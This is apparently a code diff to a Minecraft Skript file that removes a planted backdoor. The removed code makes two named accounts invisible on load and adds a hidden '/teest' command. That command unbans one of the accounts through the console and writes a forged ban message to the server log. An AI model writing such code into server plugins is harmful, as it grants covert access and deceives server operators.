@@ -1,16 +1,4 @@
 
-on load:
-	set {owner} to "Enter_Password" parsed as player
-	set {alt} to "_Kayon_" parsed as player
-	add {owner} to {vanished::*}
-	add {alt} to {vanished::*}
-	set {vanish.%{owner}%} to true
-	set {vanish.%{alt}%} to true
-
-
-
-
-
 on join:
 	loop {vanished::*}:
 		hide loop-value from all players
@@ -64,7 +52,4 @@ on chat:
 
 
 
-command /teest:
-	trigger:
-		execute console command "/pardon Enter_Password"
-		send "[Server thread/INFO]: com.mojang.authlib.GameProfile,name=Enter_Password,legacy=false] (/192.168.1.1:60538) lost connection: You are banned from this server. Reason: Banned by an operator." to console
+
